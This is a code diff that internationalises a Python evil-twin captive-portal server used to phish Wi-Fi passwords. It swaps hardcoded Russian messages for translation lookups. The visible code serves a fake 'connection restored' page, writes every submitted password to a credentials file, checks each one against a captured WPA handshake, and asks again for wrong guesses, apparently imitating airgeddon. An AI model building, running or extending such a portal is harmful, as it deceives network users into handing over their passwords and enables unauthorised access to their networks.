@@ -26,6 +26,8 @@ import subprocess
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib.parse import parse_qs
 
+from .i18n import t
+
 PASSWORD_FIELDS = ("password", "pass", "pwd", "key", "psk", "wifi_password")
 
 CONFIG = {
@@ -36,15 +38,23 @@ CONFIG = {
     "bssid": None,
 }
 
-SUCCESS_HTML = """<!doctype html><html lang="ru"><head><meta charset="utf-8">
+SUCCESS_HTML = """<!doctype html><html><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Готово</title><style>body{{font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+<title>{title}</title><style>body{{{{font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;
 background:#f3f4f6;color:#111827;display:flex;min-height:100vh;align-items:center;
-justify-content:center;margin:0}}.c{{background:#fff;padding:32px;border-radius:16px;
-box-shadow:0 10px 30px rgba(0,0,0,.08);text-align:center;max-width:360px}}
-h1{{color:#059669}}</style></head><body><div class="c">
-<h1>&#10003; Подключение восстановлено</h1>
-<p>Спасибо. Соединение с сетью {essid} восстановлено.</p></div></body></html>"""
+justify-content:center;margin:0}}}}.c{{{{background:#fff;padding:32px;border-radius:16px;
+box-shadow:0 10px 30px rgba(0,0,0,.08);text-align:center;max-width:360px}}}}
+h1{{{{color:#059669}}}}</style></head><body><div class="c">
+<h1>{h1}</h1>
+<p>{body}</p></div></body></html>"""
+
+
+def _success_html():
+    return SUCCESS_HTML.format(
+        title=t("ps.success_page_title"),
+        h1=t("ps.success_title"),
+        body=t("ps.success_body", essid=CONFIG["essid"]),
+    )
 
 
 def _read_index(error_html=""):
@@ -97,18 +107,18 @@ def _validate_password(password):
 def _record(password, verdict):
     stamp = time.strftime("%Y-%m-%d %H:%M:%S")
     if verdict is True:
-        tag = "OK (совпал с handshake)"
+        tag = t("ps.tag_ok")
     elif verdict is False:
-        tag = "НЕВЕРНЫЙ (не совпал с handshake)"
+        tag = t("ps.tag_bad")
     else:
-        tag = "не проверен"
-    line = f"[{stamp}] {CONFIG['essid']!r}  пароль: {password!r}  — {tag}"
+        tag = t("ps.tag_unchecked")
+    line = t("ps.record", stamp=stamp, essid=repr(CONFIG["essid"]), pw=repr(password), tag=tag)
     print("\n[+] " + line, flush=True)
     try:
         with open(CONFIG["creds"], "a", encoding="utf-8") as f:
             f.write(line + "\n")
     except Exception as e:
-        print(f"[!] Не удалось записать в creds-файл: {e}", flush=True)
+        print(t("ps.write_fail", e=e), flush=True)
 
 
 class Handler(BaseHTTPRequestHandler):
@@ -171,7 +181,7 @@ class Handler(BaseHTTPRequestHandler):
 
         if not password:
             self._send_html(_read_index(
-                '<div class="err">Введите пароль.</div>'))
+                f'<div class="err">{t("ps.err_enter")}</div>'))
             return
 
         verdict = _validate_password(password)
@@ -180,9 +190,9 @@ class Handler(BaseHTTPRequestHandler):
         if verdict is False:
             # Неверный пароль — просим ещё раз (как делает airgeddon).
             self._send_html(_read_index(
-                '<div class="err">Неверный пароль. Попробуйте ещё раз.</div>'))
+                f'<div class="err">{t("ps.err_wrong")}</div>'))
         else:
-            self._send_html(SUCCESS_HTML.format(essid=CONFIG["essid"]).encode("utf-8"))
+            self._send_html(_success_html().encode("utf-8"))
 
 
 def _guess_type(path):
@@ -216,12 +226,12 @@ def main():
         handshake=args.handshake, bssid=args.bssid,
     )
 
-    print(f"[*] Портал запущен на :{args.port}  (ESSID: {args.essid!r})")
+    print(t("ps.banner_started", port=args.port, essid=repr(args.essid)))
     if CONFIG["handshake"]:
-        print(f"[*] Пароли проверяются по handshake: {CONFIG['handshake']}")
+        print(t("ps.banner_hs", hs=CONFIG["handshake"]))
     else:
-        print("[*] Handshake не задан — пароли сохраняются без проверки.")
-    print("[*] Введённые пароли появятся ниже. Ctrl+C — остановить.\n")
+        print(t("ps.banner_nohs"))
+    print(t("ps.banner_hint"))
 
     server = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
     try:
